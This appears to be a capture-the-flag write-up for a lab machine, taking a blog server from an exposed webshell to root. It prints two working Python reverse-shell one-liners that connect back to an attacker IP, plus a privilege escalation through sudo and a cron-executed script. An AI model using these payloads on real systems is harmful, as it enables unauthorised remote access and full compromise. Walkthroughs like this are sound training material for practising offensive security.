```
nmap -sV -sC {victim ip}
```

We find one port open, port 80. Visiting the page, its a blog.

We run gobuster as a directory search.

```
gobuster -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
We find `/dev` and which shows a parent directory with several files. If we click on `phpbash.php` we get a webshell. We get the user `www-data` and can find the file `user.txt`.

We run netcat as a listener `nc -lnvp 1235` 

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

This will get us a shell. If we run `sudo -l`, we find `scripmanager` does not need a password to run commands. Running the following commands logs us in as `scriptmanager`

```
sudo -u scriptmanager /bin/bash
```
We run another netcat listener,

```
nc -lnvp 31337
```
Then run the following reverse shell into the file `.exploit.py`, the file will be executed by a cronjob every few minutes.

```
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.157\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py
```
In the listener on port 31337 will get a shell, just `cat /root/root.txt` to get the flag.




